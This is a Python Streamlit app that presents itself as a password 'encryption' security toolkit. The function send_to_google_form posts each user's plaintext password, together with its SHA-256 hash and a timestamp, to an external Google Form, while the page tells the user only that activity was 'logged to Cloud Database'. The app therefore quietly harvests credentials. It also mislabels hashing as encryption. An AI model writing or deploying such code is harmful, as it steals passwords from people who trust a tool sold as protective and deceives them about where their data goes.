import streamlit as st
import hashlib
import requests
from datetime import datetime

# إعدادات الصفحة
st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")

st.title("🛡️ Global Cyber Security Toolkit")
st.markdown("### SaaS Project v1.5 | Developed by Ali Al-Murtadha")

# دالة إرسال البيانات إلى Google Form (بديلة للجداول المباشرة)
def send_to_google_form(t, o, h):
    # الرابط الذي أرسلته لي تم تحويله لرابط إرسال برمجي
    url = "https://docs.google.com/forms/d/e/1FAIpQLSeL4BcwKAp8zK92-OQSadFq_8wJx4sjxcsk6mVFjAOF0guO1w/formResponse"
    
    # معرفات الخانات المستخرجة من رابطك
    payload = {
        "entry.796268616": t,  # خانة الوقت
        "entry.560405070": o,  # خانة النص الأصلي
        "entry.1206586590": h  # خانة التشفير
    }
    
    try:
        requests.post(url, data=payload)
        return True
    except:
        return False

# خانة الإدخال
password = st.text_input("Enter password to analyze & encrypt:", type="password")

if password:
    # 1. التشفير
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    st.success("✅ Encryption Complete")
    st.code(hashed_password)
    
    # 2. إرسال البيانات تلقائياً
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if send_to_google_form(current_time, password, hashed_password):
        st.info("📊 Activity logged to Cloud Database (via Form Bridge)")
    else:
        st.warning("⚠️ Logging is active, check connection.")

# سجل النشاط المحلي
if 'history' not in st.session_state:
    st.session_state.history = []

if password and (not st.session_state.history or password != st.session_state.history[-1]):
    st.session_state.history.append(password)

with st.expander("View Recent Session"):
    for item in st.session_state.history[-5:]:
        st.text(f"Processed: {item[:3]}***")
